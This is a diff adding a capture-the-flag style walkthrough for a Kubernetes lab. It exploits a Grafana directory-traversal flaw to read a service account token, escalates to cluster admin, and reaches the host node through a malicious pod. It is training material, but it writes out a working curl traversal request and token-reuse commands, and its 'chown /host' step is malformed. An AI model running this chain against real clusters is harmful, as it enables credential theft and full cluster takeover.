@@ -1,0 +1,83 @@
+
+
+Solution Steps
+
+1. Exec into the compromised Ubuntu server**
+
+   ```bash
+   kubectl exec -it ubuntu-endpoint -- /bin/bash
+   ```
+
+2. Update the system and install `curl` and `kubectl`**
+
+   Intel (amd64) Chip
+
+     ```bash
+     curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+     ```
+
+   ARM (arm64) Chip
+
+     ```bash
+     curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/arm64/kubectl"
+     ```
+
+3. Make `kubectl` executable and move it to `/usr/sbin
+
+   ```bash
+   chmod +x kubectl
+   mv kubectl /usr/sbin/
+   ```
+
+4. Check your current Kubernetes permissions
+
+   ```bash
+   kubectl auth can-i --list
+   ```
+
+   You should initially only have very limited rights.
+
+5. Enumerate further
+   Discover that:
+
+   The Grafana pod is running on TCP port 3000.
+   Grafana is vulnerable to CVE-2021-43815 (directory traversal).
+
+6. Exploit Grafana to read the service account token
+
+   ```bash
+   curl --path-as-is http://10.62.0.79:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
+   ```
+
+7. Set the token to a local variable
+
+   ```bash
+   TOKEN="<paste_token_here>"
+   ```
+
+8. Use the stolen token to elevate privileges**
+
+   ```bash
+   kubectl --token=$TOKEN auth can-i --list
+   ```
+
+   You should now have Cluster Admin rights.
+
+9. Gain access to the underlying node and steal all the certs admin.conf or superadmin.conf
+
+   Deploy and exec into a malicious pod (e.g., `BadWorker`):
+
+     ```bash
+     kubectl --token=$TOKEN exec -it BadWorker -- /bin/bash
+     ```
+   Change ownership of the host root directory to gain access:
+
+     ```bash
+     chown /host
+     ```
+
+At this point, you should have access to the underlying node and its filesystem.
+
+---
+
+Ofc, there are other issues in the cluster, see if you can find more issues or way to gain Cluster Admin?
